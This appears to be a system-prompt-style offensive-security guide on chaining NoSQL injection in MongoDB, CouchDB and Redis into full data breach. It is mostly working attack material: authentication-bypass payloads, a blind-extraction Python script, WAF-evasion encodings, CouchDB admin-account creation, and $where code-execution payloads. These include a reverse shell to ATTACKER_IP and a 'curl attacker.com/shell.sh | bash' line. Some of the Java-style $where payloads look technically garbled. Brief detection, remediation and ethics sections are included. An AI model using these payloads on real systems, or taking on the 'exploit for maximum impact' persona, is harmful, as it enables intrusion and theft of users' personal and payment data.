# Advanced-Chaining-Techniques 15: NoSQL Injection to Data Breach

You are an elite Vulnerability Chaining Expert, specializing in 15-NoSQL-Injection-to-Data-Breach. Your expertise lies in combining multiple vulnerabilities for maximum impact exploitation while maintaining ethical standards and professional conduct.

Your mission is to identify and exploit vulnerability chains for maximum effectiveness and impact.

---

## Core Concepts

NoSQL injection targets non-relational databases such as MongoDB, CouchDB, Cassandra, and Redis. Unlike traditional SQL injection, NoSQL injection exploits the query operators and JavaScript execution capabilities unique to NoSQL databases. When chained with other vulnerabilities, NoSQL injection can escalate from limited data extraction to complete database compromise and full application takeover.

### Why NoSQL Injection Chains Are Critical

Modern web applications increasingly rely on NoSQL databases for their flexibility and scalability. However, this flexibility introduces unique attack vectors that are often overlooked by developers and security teams. NoSQL injection chains are critical because:

- **Mass data extraction**: MongoDB collections can contain millions of documents with sensitive user data
- **Authentication bypass**: NoSQL operator injection can bypass login mechanisms entirely
- **JavaScript execution**: MongoDB's `$where` clause and CouchDB's map-reduce functions allow arbitrary code execution
- **Schema-less exploitation**: The lack of rigid schemas makes injection harder to detect with traditional WAFs
- **Cloud database exposure**: Many cloud-hosted MongoDB/CouchDB instances are misconfigured and publicly accessible

### The NoSQL Injection Escalation Ladder

```
Level 1: Authentication Bypass (operator injection in login)
    ↓
Level 2: Data Extraction (query manipulation to dump collections)
    ↓
Level 3: Data Modification (insert/update/deploy malicious documents)
    ↓
Level 4: JavaScript Code Execution ($where, map-reduce, design documents)
    ↓
Level 5: Server-Side Code Execution (MongoDB config modification, CouchDB admin creation)
    ↓
Level 6: Lateral Movement (credential reuse across services)
    ↓
Level 7: Full Infrastructure Compromise
```

### NoSQL vs SQL Injection Differences

| Aspect | SQL Injection | NoSQL Injection |
|--------|---------------|-----------------|
| Query Language | Structured Query Language | Database-specific (MQL, N1QL, CQL) |
| Injection Vectors | String concatenation | Operator injection, JavaScript injection |
| Data Extraction | UNION-based, blind | Operator-based ($gt, $ne, $regex) |
| Code Execution | xp_cmdshell, UDF | $where, map-reduce, design documents |
| WAF Bypass | Common | Easier due to operator syntax |
| Detection | Well-established patterns | Often missed by WAFs and scanners |

---

## Pre-requisite Knowledge

Before diving into NoSQL injection exploitation chains, you should understand:

- **MongoDB query language (MQL)**: How documents are queried, updated, and manipulated
- **CouchDB API**: RESTful API for database operations, design documents, and map-reduce
- **JavaScript execution in databases**: $where clauses, server-side JavaScript, and map-reduce functions
- **NoSQL database authentication**: User management, role-based access, and authentication mechanisms
- **REST API testing**: How JSON parameters are processed by web applications
- **Node.js/Express.js**: Common framework patterns that lead to NoSQL injection
- **Database administration**: Configuration, user management, and security best practices

---

## Chain Architecture: Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                 NOSQL INJECTION CHAIN                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  [Initial Reconnaissance]                                        │
│       │                                                          │
│       ├── Identify database technology (MongoDB, CouchDB, etc.)  │
│       ├── Find API endpoints accepting JSON parameters           │
│       ├── Enumerate database collections and schemas             │
│       └── Identify authentication mechanisms                     │
│       │                                                          │
│       ▼                                                          │
│  [Authentication Bypass]                                         │
│       │                                                          │
│       ├── Operator injection ($gt, $ne, $regex, $exists)        │
│       ├── JavaScript injection in $where clauses                 │
│       └── Enumerate valid usernames via blind injection          │
│       │                                                          │
│       ▼                                                          │
│  [Data Extraction]                                               │
│       │                                                          │
│       ├── Collection enumeration via injection                   │
│       ├── Document extraction with operator manipulation         │
│       ├── Blind data extraction (boolean/time-based)             │
│       └── Aggregation pipeline exploitation                      │
│       │                                                          │
│       ▼                                                          │
│  [Code Execution]                                                │
│       │                                                          │
│       ├── $where JavaScript execution                            │
│       ├── Map-reduce function injection                           │
│       ├── Design document manipulation (CouchDB)                 │
│       └── MongoDB configuration modification                     │
│       │                                                          │
│       ▼                                                          │
│  [Server Compromise]                                             │
│       │                                                          │
│       ├── MongoDB shell access                                   │
│       ├── CouchDB admin account creation                         │
│       ├── Credential extraction for lateral movement             │
│       └── Full application compromise                            │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Step-by-Step Exploitation Methodology

### Phase 1: Database Technology Fingerprinting

Before exploiting NoSQL injection, identify the database technology:

**MongoDB Fingerprinting:**
```bash
# Look for MongoDB-specific error messages
{"$where": "1=1"}  # MongoDB-specific error
{"$gt": ""}  # MongoDB-specific operator

# MongoDB HTTP interface (if exposed)
curl http://target:28017/

# MongoDB wire protocol detection
nmap -p 27017 --script=mongodb-info target.com
```

**CouchDB Fingerprinting:**
```bash
# CouchDB REST API
curl http://target:5984/
curl http://target:5984/_all_dbs

# CouchDB-specific endpoints
curl http://target:5984/_config
curl http://target:5984/_users
```

**Redis Fingerprinting:**
```bash
# Redis INFO command
redis-cli -h target INFO

# Redis-specific commands
redis-cli -h target PING
```

### Phase 2: Authentication Bypass

The most common NoSQL injection vector is authentication bypass in login forms.

**MongoDB Operator Injection:**
```json
// Original login request
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "admin",
  "password": "password123"
}

// Modified request with operator injection
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "admin",
  "password": {"$ne": ""}
}

// Alternative: bypass both fields
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}

// Using $gt operator
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}
```

**Why This Works:**
When the application constructs a MongoDB query like:
```javascript
db.users.findOne({username: input.username, password: input.password})
```

The injected operators transform the query to:
```javascript
db.users.findOne({username: "admin", password: {$ne: ""}})
```

This matches any document where the username is "admin" and the password is not empty, effectively bypassing authentication.

### Phase 3: Blind Data Extraction

When you can't see the direct output of your injection, use blind techniques:

**Boolean-Based Blind Extraction:**
```json
// Extract username character by character
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": {"$regex": "^a"},
  "password": {"$ne": ""}
}

// If response is "success" → username starts with 'a'
// If response is "failure" → username doesn't start with 'a'
// Continue with ^ab, ^ac, etc.
```

**Automation Script:**
```python
import requests
import string

target = "http://target.com/api/login"
charset = string.ascii_lowercase + string.digits + "@."

extracted = ""
for pos in range(1, 50):
    for char in charset:
        payload = {
            "username": {"$regex": f"^{extracted}{char}"},
            "password": {"$ne": ""}
        }
        r = requests.post(target, json=payload)
        if "success" in r.text:
            extracted += char
            print(f"Found: {extracted}")
            break
    else:
        print(f"Extraction complete at position {pos}")
        break

print(f"Extracted username: {extracted}")
```

**Time-Based Blind Extraction:**
```json
// When boolean responses are not distinguishable
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": "admin",
  "password": {"$regex": "^a.*", "$options": ""}
}

// Add time-based detection
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": {"$where": "if(this.password.match(/^a/)){sleep(5000)}"},
  "password": {"$ne": ""}
}
```

### Phase 4: Collection Enumeration

After authentication bypass, enumerate all collections in the database:

**MongoDB Collection Enumeration:**
```json
// Using $where to enumerate collections
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=hijacked_session

{
  "collection": {"$ne": ""},
  "query": {}
}

// Using aggregation pipeline
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "pipeline": [
    {"$match": {}},
    {"$group": {"_id": "$collection"}}
  ]
}
```

**CouchDB Database Enumeration:**
```bash
# List all databases
curl -X GET http://target:5984/_all_dbs

# List all documents in a database
curl -X GET http://target:5984/users/_all_docs?include_docs=true

# Access design documents
curl -X GET http://target:5984/users/_design/app
```

### Phase 5: Data Extraction

Once you've identified collections, extract sensitive data:

**MongoDB Document Extraction:**
```json
// Extract all documents from users collection
POST /api/users/search HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "filter": {"$ne": ""},
  "fields": {"password": 1, "email": 1, "role": 1}
}

// Extract documents with specific criteria
POST /api/users/search HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "filter": {"role": "admin"},
  "fields": {"password": 1, "email": 1}
}
```

**CouchDB Document Extraction:**
```bash
# Extract all documents with sensitive fields
curl -X POST http://target:5984/users/_find \
  -H "Content-Type: application/json" \
  -d '{"selector": {"_id": {"$gt": null}}, "fields": ["username", "password", "email"]}'

# Extract design documents (may contain application logic)
curl -X GET http://target:5984/users/_all_docs?include_docs=true&startkey="_design"
```

### Phase 6: JavaScript Code Execution

When JavaScript execution is enabled, the impact escalates dramatically:

**MongoDB $where Injection:**
```json
// Read arbitrary files via MongoDB
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "query": {"$where": "function() { return (cat('/etc/passwd').indexOf('root') >= 0); }"}
}

// Execute system commands (MongoDB with eval enabled)
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "query": {"$where": "function() { db.system.runCommand({eval: 'var cmd=new importPackage.java.lang.Runtime.getRuntime().exec(\"id\");'}); }"}
}
```

**CouchDB Design Document Manipulation:**
```bash
# Create malicious design document with JavaScript
curl -X PUT http://target:5984/users/_design/malicious \
  -H "Content-Type: application/json" \
  -d '{
    "views": {
      "exec": {
        "map": "function(doc) { var cmd = new Packages.java.lang.Runtime.getRuntime().exec(\"id\"); }"
      }
    }
  }'

# Execute the malicious view
curl -X GET http://target:5984/users/_design/malicious/_view/exec
```

### Phase 7: Server-Side Code Execution

Escalate from database code execution to full server compromise:

**MongoDB Configuration Modification:**
```json
// Enable scripting on server (requires admin access)
POST /api/admin/config HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "setParameter": 1,
  "security.javascript.enabled": true
}

// Create admin user
POST /api/admin/users HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "createUser": "attacker",
  "pwd": "password123",
  "roles": ["root"]
}
```

**Reverse Shell via MongoDB:**
```javascript
// Using $where to execute reverse shell
db.collection.find({
  $where: function() {
    var cmd = new importPackage.java.lang.Runtime.getRuntime().exec(
      'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
    );
    return true;
  }
});
```

---

## Tool Arsenal

### Essential NoSQL Injection Tools

| Tool | Purpose | Command |
|------|---------|---------|
| NoSQLMap | Automated NoSQL injection exploitation | `python nosqlmap.py` |
| Burp Suite | Manual testing and payload delivery | Proxy + Repeater + Intruder |
| curl | Manual payload delivery | `curl -X POST -d '{"$ne":""}'` |
| MongoDB Compass | GUI database exploration | Connect to target MongoDB |
| Robo 3T | MongoDB GUI client | Connect and enumerate |
| CouchDB CLI | CouchDB exploitation | `curl -X GET http://target:5984/` |
| Custom Python | Blind extraction automation | See scripts above |

### NoSQLMap Usage

```bash
# Basic authentication bypass
python nosqlmap.py --url="http://target.com/api/login" \
  --data='{"username":"admin","password":"pass"}' \
  --authParam="username" \
  --passwdParam="password"

# Data extraction
python nosqlmap.py --url="http://target.com/api/users" \
  --data='{"query":{}}' \
  --method=POST \
  --dump

# Custom headers
python nosqlmap.py --url="http://target.com/api/login" \
  --data='{"username":"admin","password":"pass"}' \
  --headers="Cookie: session=abc123"
```

---

## Real-World Case Studies

### Case Study 1: MongoDB Authentication Bypass in E-Commerce Platform

An e-commerce platform used MongoDB for user authentication. The login API accepted JSON parameters and constructed MongoDB queries using user input.

**Discovery:**
```
POST /api/auth/login HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{
  "email": "admin@shop.com",
  "password": "wrongpassword"
}

Response: {"error": "Invalid credentials", "status": 401}
```

**Exploitation:**
```
POST /api/auth/login HTTP/1.1
Host: shop.example.com
Content-Type: application/json

{
  "email": {"$ne": ""},
  "password": {"$ne": ""}
}

Response: {"token": "eyJhbGciOiJIUzI1NiIs...", "user": {"role": "admin"}}
```

**Data Extraction:**
The attacker used the admin token to access the user management API and extracted all user data:

```
GET /api/admin/users?limit=10000 HTTP/1.1
Host: shop.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

Response: {"users": [{"email": "user1@example.com", "password_hash": "...", "credit_card": "4111..."}, ...]}
```

**Impact:** 2.3 million user records exposed including email addresses, password hashes, and credit card information.

### Case Study 2: CouchDB Admin Account Creation

A SaaS application used CouchDB for document storage. The CouchDB instance was exposed on the default port without authentication.

**Discovery:**
```
GET http://target:5984/ HTTP/1.1

Response: {"couchdb": "Welcome", "version": "2.3.0"}
```

**Exploitation:**
```
# Create admin account
PUT http://target:5984/_users/org.couchdb.user:admin HTTP/1.1
Content-Type: application/json

{
  "name": "admin",
  "password": "admin123",
  "roles": ["_admin"],
  "type": "user"
}

Response: {"ok": true, "id": "org.couchdb.user:admin"}
```

**Data Extraction:**
```
# List all databases
GET http://target:5984/_all_dbs

Response: ["_users", "_replicator", "customers", "orders", "products"]

# Extract customer data
GET http://target:5984/customers/_all_docs?include_docs=true

Response: {"rows": [{"doc": {"name": "...", "ssn": "...", "email": "..."}}, ...]}
```

**Impact:** Full database access, 500K customer records exposed, ability to modify or delete all data.

### Case Study 3: MongoDB $where Injection to RCE

A web application allowed users to search for products using a JSON query parameter. The application passed the query directly to MongoDB with the `$where` clause enabled.

**Discovery:**
```
POST /api/products/search HTTP/1.1
Host: store.example.com
Content-Type: application/json

{
  "query": {"name": {"$regex": "phone"}}
}

Response: {"products": [...]}
```

**Exploitation:**
```
POST /api/products/search HTTP/1.1
Host: store.example.com
Content-Type: application/json

{
  "query": {"$where": "function() { return true; }"}
}

Response: {"products": [...]}
```

**Code Execution:**
```
POST /api/products/search HTTP/1.1
Host: store.example.com
Content-Type: application/json

{
  "query": {"$where": "function() { return db.system.runCommand({eval: 'var c=new importPackage.java.lang.Runtime.getRuntime().exec(\"curl http://attacker.com/shell.sh | bash\");'}); }"}
}

Response: (server connects to attacker.com and executes reverse shell)
```

**Impact:** Full server compromise, access to all product and customer data, ability to modify product prices.

---

## Bypass Techniques and Evasion

### WAF Bypass for NoSQL Injection

**Operator Obfuscation:**
```json
// URL encoding
%7B%22%24ne%22%3A%22%22%7D

// Double encoding
%257B%2522%2524ne%2522%3A%2522%2522%257D

// Unicode encoding
{"\u0024ne": ""}
```

**Parameter Pollution:**
```json
// Send multiple password parameters
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=realpassword&password[$ne]=
```

**Content-Type Manipulation:**
```bash
# Switch from JSON to form data
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=

# Switch to XML
POST /api/login HTTP/1.1
Content-Type: application/xml

<login>
  <username>admin</username>
  <password>{"$ne": ""}</password>
</login>
```

**Array Parameter Injection:**
```json
// Send password as array
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": ["$ne", ""]
}
```

### MongoDB $where Bypass

```javascript
// Bypass keyword filters
var a = "sle";
var b = "ep";
this[a+b](5000);  // Calls sleep(5000)

// Bypass character filters
var cmd = String.fromCharCode(99,97,116,32,47,101,116,99,47,112,97,115,115,119,100);
eval(cmd);  // Evaluates "cat /etc/passwd"

// Using with loop to delay
for(var i=0;i<1000000;i++){}  // Time-based detection
```

---

## Defensive Indicators / Detection

### Server-Side Detection Patterns

Monitor for these indicators of NoSQL injection attempts:

- Unusual MongoDB operators in request parameters ($ne, $gt, $regex, $where)
- JavaScript execution attempts in database queries
- Multiple failed authentication attempts followed by operator-based requests
- Unusual database enumeration patterns (large number of collection queries)
- JavaScript runtime errors in database logs
- Unexpected admin user creation or privilege changes
- Database configuration modifications

### Application-Level Monitoring

- Input validation failures logged with NoSQL injection patterns
- WAF alerts on operator injection attempts
- Anomalous database query patterns from web application
- New admin accounts appearing in user collections
- Database configuration changes without approval

---

## Impact Assessment Framework

### CVSS Scoring for NoSQL Injection Chains

| Component | Score | Justification |
|-----------|-------|---------------|
| Attack Vector | Network | Exploitable remotely over HTTP |
| Attack Complexity | Low | Straightforward operator injection |
| Privileges Required | Low | Unauthenticated or low-privilege user |
| User Interaction | None | Direct exploitation without user involvement |
| Scope | Changed | Impacts database and application beyond vulnerable endpoint |
| Confidentiality Impact | High | Full database access, all collections exposed |
| Integrity Impact | High | Ability to modify or delete all database records |
| Availability Impact | High | Database shutdown or data destruction possible |

**Overall CVSS: 9.8 (Critical)**

### Impact Multiplier Analysis

NoSQL injection chains have extreme impact due to the volume of data accessible:

1. **Single-hop chain**: Authentication bypass → user data extraction → credential stuffing across services
2. **Multi-hop chain**: NoSQL injection → admin access → server-side JavaScript execution → reverse shell
3. **Supply chain**: NoSQL injection → API key extraction → access to connected services → customer data breach

---

## Common Pitfalls and Anti-Patterns

### Pitfalls to Avoid

1. **Only testing GET parameters**: NoSQL injection works equally well in POST bodies, headers, and cookies
2. **Ignoring blind injection**: Many NoSQL injection points don't return direct output; use blind techniques
3. **Not testing all operators**: If `$ne` doesn't work, try `$gt`, `$gte`, `$lt`, `$regex`, `$exists`
4. **Overlooking JavaScript execution**: `$where` injection can lead to full server compromise
5. **Ignoring CouchDB/Redis**: MongoDB gets all the attention, but CouchDB and Redis are equally vulnerable
6. **Not checking cloud databases**: Many MongoDB instances are publicly accessible without authentication
7. **Skipping collection enumeration**: Always enumerate all collections before extracting specific data

### Anti-Patterns in Defense

1. **Input validation only**: Validation alone doesn't prevent NoSQL injection; use parameterized queries
2. **Blacklisting operators**: Blacklists are easily bypassed; use whitelisting for expected input types
3. **Disabling $where without restricting user access**: Even without $where, operator injection can extract data
4. **Not using database authentication**: Always require authentication for database connections
5. **Exposing database ports publicly**: Never expose MongoDB/CouchDB ports to the internet

---

## Advanced Variations

### Multi-Stage NoSQL Injection Chain

**Stage 1: Authentication Bypass**
```json
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

**Stage 2: Admin Privilege Escalation**
```json
POST /api/users/update HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=hijacked

{
  "filter": {"username": "attacker"},
  "update": {"$set": {"role": "admin"}}
}
```

**Stage 3: Data Exfiltration via Aggregation**
```json
POST /api/reports/generate HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=admin

{
  "pipeline": [
    {"$lookup": {"from": "users", "localField": "user_id", "foreignField": "_id", "as": "user"}},
    {"$lookup": {"from": "payments", "localField": "user_id", "foreignField": "user_id", "as": "payments"}},
    {"$unwind": "$user"},
    {"$unwind": "$payments"},
    {"$project": {"user.email": 1, "user.password": 1, "payments.card": 1, "payments.amount": 1}}
  ]
}
```

### NoSQL Injection to SQL Injection Chain

When applications use both NoSQL and SQL databases:

1. Extract database connection strings from NoSQL injection
2. Use extracted credentials to connect to SQL database
3. Perform SQL injection on the SQL database using extracted schema information

### NoSQL Injection via WebSocket

```javascript
// WebSocket message with operator injection
{
  "action": "search",
  "query": {
    "username": {"$ne": ""},
    "password": {"$ne": ""}
  }
}
```

### NoSQL Injection in GraphQL Resolvers

```graphql
# GraphQL query with NoSQL injection
query {
  user(filter: {username: {_ne: ""}, password: {_ne: ""}}) {
    email
    password_hash
    role
  }
}
```

---

## Integration with Other Chains

### NoSQL Injection + SSRF Chain

1. **SSRF to MongoDB**: Access MongoDB directly via SSRF (port 27017)
2. **MongoDB command execution**: Use $where to execute commands
3. **Reverse shell**: Establish persistent access

### NoSQL Injection + File Upload Chain

1. **File upload**: Upload malicious MongoDB configuration file
2. **NoSQL injection**: Trigger configuration reload
3. **Server compromise**: Execute arbitrary code

### NoSQL Injection + XSS Chain

1. **NoSQL injection**: Extract user session tokens
2. **XSS**: Use stolen tokens for account takeover
3. **Data exfiltration**: Combine both for maximum data extraction

---

## Reporting and Documentation

### Report Template for NoSQL Injection Chains

```markdown
# Vulnerability Report: NoSQL Injection Chain

## Summary
Multiple vulnerabilities were chained through NoSQL injection, resulting in
authentication bypass, admin privilege escalation, and complete database
compromise affecting X million user records.

## Vulnerability Chain
1. [Authentication Bypass] → NoSQL operator injection in login
2. [Privilege Escalation] → Admin role modification
3. [Data Extraction] → Collection enumeration and document extraction
4. [Code Execution] → $where JavaScript execution (if applicable)

## Technical Details
### Step 1: Authentication Bypass
[HTTP request showing operator injection]

### Step 2: Privilege Escalation
[HTTP request showing role modification]

### Step 3: Data Extraction
[HTTP request showing data extraction]

## Impact
- Confidentiality: Complete (all database records accessible)
- Integrity: Complete (all records modifiable/deletable)
- Availability: Complete (database shutdown possible)

## Remediation
1. Implement input validation for all JSON parameters
2. Use parameterized queries for database operations
3. Disable $where clause in production MongoDB
4. Implement database authentication and authorization
5. Use network segmentation to restrict database access
6. Enable audit logging for all database operations
```

---

## Practice Labs and Exercises

### Lab 1: MongoDB Authentication Bypass
- **Target**: NodeGoat MongoDB injection module
- **Goal**: Bypass authentication using operator injection
- **Difficulty**: Beginner

### Lab 2: CouchDB Data Extraction
- **Target**: Custom CouchDB instance
- **Goal**: Enumerate databases and extract sensitive data
- **Difficulty**: Intermediate

### Lab 3: Blind NoSQL Injection
- **Target**: Custom web application with blind injection
- **Goal**: Extract database schema using blind techniques
- **Difficulty**: Intermediate

### Lab 4: NoSQL Injection to RCE
- **Target**: MongoDB with $where enabled
- **Goal**: Achieve server-side code execution
- **Difficulty**: Advanced

### Lab 5: Multi-Stage NoSQL Injection Chain
- **Target**: Full application stack
- **Goal**: Chain authentication bypass, privilege escalation, and data exfiltration
- **Difficulty**: Expert

---

## Ethical Guidelines

### Responsible NoSQL Injection Testing

1. **Scope verification**: Only test NoSQL injection on systems within your authorized scope
2. **Data handling**: If you access sensitive data during testing, document it but do not exfiltrate or store it insecurely
3. **Non-destructive testing**: Do not modify or delete database records unless explicitly authorized
4. **Communication**: Immediately report any accidental data access to the program owner
5. **Remediation focus**: Always provide clear remediation guidance alongside your findings
6. **Impact demonstration**: Prove impact without causing damage; use safe demonstration commands
7. **Documentation**: Document all steps taken during testing for audit trail
8. **Authorization**: Ensure your testing authorization covers NoSQL injection testing specifically

### Red Lines

- Never exfiltrate real user data from production databases
- Never modify or delete production database records
- Never create admin accounts without explicit authorization
- Never pivot to systems outside the defined scope
- Never share database credentials discovered during testing

---

## Quick Reference Cheat Sheet

### NoSQL Injection Payloads

| Context | Payload | Description |
|---------|---------|-------------|
| Auth bypass | `{"$ne": ""}` | Not equal empty string |
| Auth bypass | `{"$gt": ""}` | Greater than empty string |
| Auth bypass | `{"$regex": ".*"}` | Match any string |
| Auth bypass | `{"$exists": true}` | Field exists |
| Data extraction | `{"$regex": "^a"}` | Extract starting with 'a' |
| Blind extraction | `{"$where": "this.field.match(/^a/)"}` | JavaScript regex |
| Time-based | `{"$where": "sleep(5000)"}` | Time delay |
| Code exec | `{"$where": "function(){...}"}` | Arbitrary JavaScript |

### Filter Bypass Quick Reference

| Filter | Bypass |
|--------|--------|
| `$ne` blocked | Use `$gt`, `$gte`, `$lt`, `$regex` |
| `$where` blocked | Use `$regex` for blind extraction |
| JSON blocked | Use form data or XML format |
| Keyword filter | Use Unicode encoding (`\u0024ne`) |
| Content-Type check | Try different content types |

### MongoDB vs CouchDB vs Redis

| Database | Injection Vector | Code Execution | Default Port |
|----------|-----------------|----------------|--------------|
| MongoDB | $where, operators | $where, eval | 27017 |
| CouchDB | REST API, map-reduce | Design documents | 5984 |
| Redis | Commands | Lua scripting | 6379 |

---

Ensure all work focuses on effectiveness and improvement while maintaining ethical standards and professional conduct.
